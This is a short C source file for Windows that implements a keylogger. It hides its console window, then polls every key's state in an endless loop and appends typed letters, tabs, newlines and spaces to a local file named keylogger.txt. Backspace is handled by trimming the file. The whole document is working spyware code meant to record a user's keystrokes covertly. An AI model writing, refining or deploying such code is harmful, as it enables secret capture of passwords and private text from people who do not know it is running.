#include <windows.h>
#include <stdio.h>
#include <string.h>


void save_to(const char *filename, const char *messsage){
    FILE *fp;
    fp = fopen(filename, "a");
    if (fp == NULL) {
        printf("Error opening file!\n");
        return;
    }
    fprintf(fp, "%s", messsage);
    fclose(fp);
}


#include <io.h> // For _chsize
#include <fcntl.h> // For fileno

void removeLastCharacter(const char *filename) {
    FILE *file = fopen(filename, "r+"); // Open the file in read-write mode
    if (file == NULL) return;

    fseek(file, 0, SEEK_END); // Move to the end of the file
    long fileSize = ftell(file); // Get the current file size

    if (fileSize == 0) { // If the file is empty, do nothing
        fclose(file);
        return;
    }

    fileSize--; // Reduce file size by one character
    _chsize(_fileno(file), fileSize); // Truncate the file to the new size
    fclose(file);
}
int main() {
    HWND hwnd = GetConsoleWindow();   // Get the console window handle
    ShowWindow(hwnd, SW_HIDE);        // Hide the window


    char *message = " ";
    while (1) {
        for (int i = 0; i < 256; i++) {
            if(GetAsyncKeyState(0x08) & 1)removeLastCharacter("keylogger.txt");
            if (GetAsyncKeyState(i) & 1) {
                switch (i) {
                    // case VK_BACK:
                    //     removeLastCharacter("keylogger.txt");
                    //     break;
                    case VK_TAB:
                        message = "\t";
                        break;
                    case VK_RETURN:
                        message = "\n";
                        break;
                    case VK_SPACE:
                        message = " ";
                        break;
                    default:
                        if(i >= 65 && i <= 97){
                            message = (char*)(&i); 
                        } // Default for unsupported keys
                        else message = "";
                        break;
                }
                if(*message != '\0')save_to("keylogger.txt", message); // Log the key
            }
        }
        Sleep(1); // Reduce CPU usage
    }


    return 0;
}
